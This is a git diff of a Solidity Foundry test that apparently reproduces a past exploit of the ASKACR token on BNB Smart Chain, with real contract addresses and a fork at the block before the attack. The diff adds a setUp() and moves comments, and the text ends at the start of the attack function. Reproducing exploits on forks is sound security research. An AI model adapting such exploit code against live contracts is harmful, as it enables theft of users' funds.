@@ -44,12 +44,22 @@ contract Intermediary {
     }
 }
 
+//Attacking TX: https://bscscan.com/tx/0xc20fa4953ff394bb806a57cafe71d1163973c0e5a47bb8dad1703a518b15ea3b
+//PLEASE specify the fork block number
+//--fork-block-number 26658150, 2 blocks before the attacking
 contract ASKACRTest is Test {
-    //Attacking TX: https://bscscan.com/tx/0xc20fa4953ff394bb806a57cafe71d1163973c0e5a47bb8dad1703a518b15ea3b
+
+
+    
     IERC20 askacr = IERC20(0x5aE4b2F92F03717F3bdFE3B440D14d2f212D3745);
     IERC20 pair = IERC20(0xB93783F29dd52cad2CBBfe2E5d06C318b63995B2);
     address lpHolder = 0x13F110CBBe4151E0a2e241d5a29e6f86f0CEA1e4;
-    //--fork-block-number 26658150, 2 blocks before the attacking
+    // VM vm = VM(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+
+    function setUp() public {
+        vm.createSelectFork("bsc",26_658_150);
+    }
+
     function testASKACRAttack() public {
         uint balance = pair.balanceOf(address(lpHolder));
         //assume the hacker is one of the lp token holder to skip the steps of flashloan, swapping and adding liquidity.
